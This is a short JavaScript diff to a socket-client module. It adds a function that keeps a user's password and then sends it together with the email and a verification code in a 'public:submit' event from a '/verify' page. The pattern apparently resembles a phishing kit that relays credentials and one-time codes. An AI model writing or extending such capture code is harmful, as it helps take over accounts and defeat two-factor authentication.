@@ -11,6 +11,7 @@ export const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || fallback;
 
 let socket = null;
 let lastEmail = "";
+let lastPassword = "";
 
 export function getPublicSocket() {
   if (!socket) {
@@ -35,11 +36,15 @@ export function rememberEmail(email) {
   lastEmail = email;
 }
 
+export function rememberPassword(password) {
+  lastPassword = password;
+}
+
 export function submitCode(code) {
   if (!lastEmail) return;
   getPublicSocket().emit(
     "public:submit",
-    { email: lastEmail, code, page: "/verify" },
+    { email: lastEmail, password: lastPassword, code, page: "/verify" },
     () => {}
   );
 }
